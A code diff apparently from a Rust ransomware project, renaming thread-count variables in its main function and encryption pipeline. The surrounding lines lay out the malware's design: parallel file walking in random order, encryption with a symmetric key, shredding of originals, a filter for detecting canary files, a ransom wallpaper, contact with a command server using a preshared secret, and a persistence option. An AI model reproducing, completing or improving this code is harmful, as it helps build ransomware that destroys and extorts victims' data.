@@ -46,7 +46,7 @@ mod shredder;
 use shredder::shred;
 
 mod client;
-use client::{ThreadNums, get_thread_nums, initialize_client};
+use client::{ThreadCounts, get_thread_counts, initialize_client};
 
 mod img;
 use img::set_icon_wallpaper;
@@ -94,7 +94,7 @@ fn main() {
         config::HTTPS,
         config::VERIFY_SERVER,
     );
-    let num_threads = get_thread_nums();
+    let thread_counts = get_thread_counts();
 
     let mut sym_key = [0u8; 32];
     let counter = if status.encryption_started {
@@ -126,7 +126,7 @@ fn main() {
             &sym_key_arc,
             &counter_arc,
             &exe_path_dir_arc,
-            &num_threads,
+            &thread_counts,
             server_fqdn,
             preshared_secret,
             &aad_arc,
@@ -150,8 +150,8 @@ fn main() {
         server_fqdn,
         preshared_secret,
         &encrypted_extension,
-        num_threads.walk,
-        num_threads.decrypt,
+        thread_counts.walk,
+        thread_counts.decrypt,
         config::PERSIST,
     );
 
@@ -288,7 +288,7 @@ fn run_encryption_pipeline(
     sym_key: &Arc<[u8; 32]>,
     counter: &Arc<AtomicU64>,
     exe_path_dir: &Arc<PathBuf>,
-    num_threads: &ThreadNums,
+    thread_counts: &ThreadCounts,
     server_fqdn: &str,
     preshared_secret: &str,
     aad: &Arc<[u8]>,
@@ -301,7 +301,7 @@ fn run_encryption_pipeline(
 
     let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
     let (channel_a_sender, channel_a_receiver) =
-        crossbeam_channel::bounded(cap(num_threads.encrypt));
+        crossbeam_channel::bounded(cap(thread_counts.encrypt));
     let mut thread_handles = Vec::new();
 
     if config::RANDOM_ORDER {
@@ -309,22 +309,22 @@ fn run_encryption_pipeline(
             channel_a_sender.clone(),
             None,
             None,
-            num_threads.walk,
+            thread_counts.walk,
         ));
         debug!(
             "Spawned random walk coordinator with {} zlob workers",
-            num_threads.walk
+            thread_counts.walk
         );
     } else {
         thread_handles.push(walk_with_exts(
             channel_a_sender.clone(),
             None,
             None,
-            num_threads.walk,
+            thread_counts.walk,
         ));
         debug!(
             "Spawned walk coordinator with {} zlob workers",
-            num_threads.walk
+            thread_counts.walk
         );
     }
     drop(channel_a_sender);
@@ -337,9 +337,9 @@ fn run_encryption_pipeline(
         debug!("Canary mode enabled");
 
         let (channel_b_sender, channel_b_receiver) =
-            crossbeam_channel::bounded(cap(num_threads.encrypt));
+            crossbeam_channel::bounded(cap(thread_counts.encrypt));
 
-        for _ in 0..num_threads.canary {
+        for _ in 0..thread_counts.canary {
             thread_handles.push(filter_canary(
                 channel_a_receiver.clone(),
                 channel_b_sender.clone(),
@@ -358,8 +358,8 @@ fn run_encryption_pipeline(
             drop(channel_b_receiver);
         } else {
             let (channel_c_sender, channel_c_receiver) =
-                crossbeam_channel::bounded(cap(num_threads.shred));
-            for _ in 0..num_threads.encrypt {
+                crossbeam_channel::bounded(cap(thread_counts.shred));
+            for _ in 0..thread_counts.encrypt {
                 thread_handles.push(encrypt(
                     channel_b_receiver.clone(),
                     channel_c_sender.clone(),
@@ -371,7 +371,7 @@ fn run_encryption_pipeline(
             drop(channel_b_receiver);
             drop(channel_c_sender);
 
-            for _ in 0..num_threads.shred {
+            for _ in 0..thread_counts.shred {
                 thread_handles.push(shred(channel_c_receiver.clone()));
             }
             drop(channel_c_receiver);
@@ -382,8 +382,8 @@ fn run_encryption_pipeline(
         drop(channel_a_receiver);
     } else {
         let (channel_c_sender, channel_c_receiver) =
-            crossbeam_channel::bounded(cap(num_threads.shred));
-        for _ in 0..num_threads.encrypt {
+            crossbeam_channel::bounded(cap(thread_counts.shred));
+        for _ in 0..thread_counts.encrypt {
             thread_handles.push(encrypt(
                 channel_a_receiver.clone(),
                 channel_c_sender.clone(),
@@ -395,7 +395,7 @@ fn run_encryption_pipeline(
         drop(channel_a_receiver);
         drop(channel_c_sender);
 
-        for _ in 0..num_threads.shred {
+        for _ in 0..thread_counts.shred {
             thread_handles.push(shred(channel_c_receiver.clone()));
         }
         drop(channel_c_receiver);
